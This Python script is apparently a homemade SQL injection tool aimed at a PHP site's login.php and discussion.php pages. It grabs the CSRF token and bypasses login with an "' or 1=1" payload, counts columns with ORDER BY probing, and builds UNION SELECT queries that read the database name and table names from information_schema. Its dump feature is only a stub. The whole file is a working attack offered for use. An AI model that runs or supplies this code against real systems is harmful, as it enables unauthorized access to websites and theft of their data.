import requests
from bs4 import BeautifulSoup
from getopt import getopt
import sys
import time
import datetime

TARGET=""      #ip address
URL=""         #url target
s=None
DB=False
TC=False
DUMP=False

def getsession(fullurl):
    global TARGET, URL, s

    login_page="http://"+TARGET+"/"+"login.php"
    login_action="http://"+TARGET+"/"+"auth/auth.php"
            
    # print(login_page)
    # print(login_action)
    # s=requests.Session()
    # print(fullurl)
    request_session=s.get(login_page)
    soup=BeautifulSoup(request_session.content, "html.parser")
    csrf=soup.find('input', {'name': 'csrf_token'}).get('value')
    # print(soup)
    # print(csrf)
    user="' or 1=1 limit 1-- 1"
    password="123"
            # user="bot"
            # password="bot"
    sqli={
        "csrf_token": csrf,
        "username": user,
        "password": password,
        "action": "login"
        }
    response_login=s.post(login_action, data=sqli)
    link=response_login.url
    # print(sqli['username'])
    # print(response_login.status_code)
    # print(link)
    if response_login.url!=login_page:
        print("[+] The website is vulnerable to SQL Injection Attack")
        print(f"[+] Successfully getting the website authentication with PHPSESSID value {s.cookies['PHPSESSID']}")
        print("")
    else:
        print("[-] Failed to get authentication")
    
    # totalcolumn(fullurl)

def totalcolumn(fullurl):
    global TARGET, URL, s, DB, TC, DUMP

    print("[+] Generate total column for union-based SQL Injection Attack")
    
    # print(fullurl)
    oder_url=(fullurl + " ORDER BY {}")  
    count=1
    column=0
    while True:
        order_by_url=oder_url.format(count)
        response_discussion=s.get(order_by_url)
        soup=BeautifulSoup(response_discussion.content, 'html.parser')
        heading=soup.find("h3")
        # print(comments)
        if heading is None:
            column=count-1
            break
        count+=1
    # print(column)
    return column

def urldump(fullurl, column):
    global TARGET, URL, s, DB, TC, DUMP
    # link="http://192.168.43.128/discussion.php?discussion_id=-1"
    # print(len(link))
    print(f"[+] Launch union-based SQL Injection Attack at URL {fullurl}")
    position=51
    newchar="-1"
    fullurl=fullurl[:position] + newchar + fullurl[position+2:]
    # print(fullurl)
    dumpurl=fullurl + " UNION SELECT "
    for i in range(1, column+1):
        dumpurl=dumpurl+str(i)
        if i!=column:
            dumpurl=dumpurl+','
    # print(dumpurl)
    # databasename(dumpurl)

    # discussion=s.get(dumpurl)
    # soup=BeautifulSoup(discussion.text,'html.parser')
    # print(soup.prettify())
    # databasename(fullurl, dumpurl)
    return dumpurl

def databasename(fullurl, dumpurl):
    global TARGET, URL, s, DB, TC, DUMP

    # unionurl=("http://" + TARGET + "/")
    print("[+] Show the request result")
    print("")
    position=68
    newchar=",DATABASE()"
    dumpurl=dumpurl[:position] + newchar + dumpurl[position+2:]
    # print(dumpurl)
    # database_url = dumpurl.replace('2','DATABASE()')
    website_database=s.get(dumpurl)
    soup=BeautifulSoup(website_database.text,'html.parser')
    contents=soup.find('h3')
    if(contents==""):
        print("[-] The target url is not vulnerable to union-based SQL Injection Attack")
        sys.exit()
    return contents.text.strip()
    
def tableinformation(dumpurl, namadatabase): 
    # tc
    global TARGET, URL, s, DB, TC, DUMP
    print("[+] Show the request result")
    # print(dumpurl)
    url_table=dumpurl + " from information_schema.tables where table_schema='" + namadatabase +"'"
    # print(url_table)
    position=68
    newchar=",group_concat(table_name)"
    url_table=url_table[:position] + newchar + url_table[position+2:]

    website_url=s.get(url_table)
    soup=BeautifulSoup(website_url.text,'html.parser')
    contents = soup .find('h3')
    
    table_name=contents.text.strip().split(',')
    # print(table_name)
    # return table_name

    curr_time=datetime.datetime.now()

    print("=================================================================================")
    print("")

    for table in table_name:
        print(f"Table Name              : {table}")
        print(f"Table Create Time       : {curr_time}")
        print("=================================================================================")
        print("")

def tabledump(fullurl):
    # dump
    global TARGET, URL, s, DB, TC, DUMP
    print("test3")

def main():
    global TARGET, URL, s, DB, TC, DUMP

    args,_=getopt(sys.argv[1:], "t:u:", ["target=, url=", "db", "tc", "dump"])

    for key,value in args:
        if key=="-t" or key=="--target":
            TARGET=value
        elif key=="-u" or key=="--url":
            URL=value
        elif key=="--db":
            DB=True
        elif key=="--tc":
            TC=True
        elif key=="--dump":
            DUMP=True 
    
    if TARGET=="" or URL=="":
        print("-t/--target and -u/--url argument is required")
        sys.exit()
    else:
        fullurl=("http://"+TARGET+"/"+URL)
        # http://192.168.43.128/discussion.php?discussion_id=1
        # print(fullurl)
        s=requests.Session()
        response=s.get(fullurl)
        if response.status_code!=200:
            print("[-] The requested URL not found")
        else:
            print("[*] Try login the website using SQL Injection Attack")
            print("")
            getsession(fullurl)
    if(DB==False and TC==False and DUMP==False):
        sys.exit()
    elif(DB==True):
        column=totalcolumn(fullurl)
        dumpurl=urldump(fullurl,column)
        namadatabase=databasename(fullurl,dumpurl)
        print("Nama Database:")
        print(namadatabase)
    elif(TC==True):
        column=totalcolumn(fullurl)
        dumpurl=urldump(fullurl,column)
        namadatabase=databasename(fullurl,dumpurl)
        tableinformation(dumpurl,namadatabase)
    elif(DUMP==True):
        tabledump(fullurl)
    # elif(DB==True and TC==True and DUMP==True):
    #     databasename(fullurl)
    #     tableinformation(fullurl)
    #     tabledump(fullurl)

if __name__ == "__main__":
    main()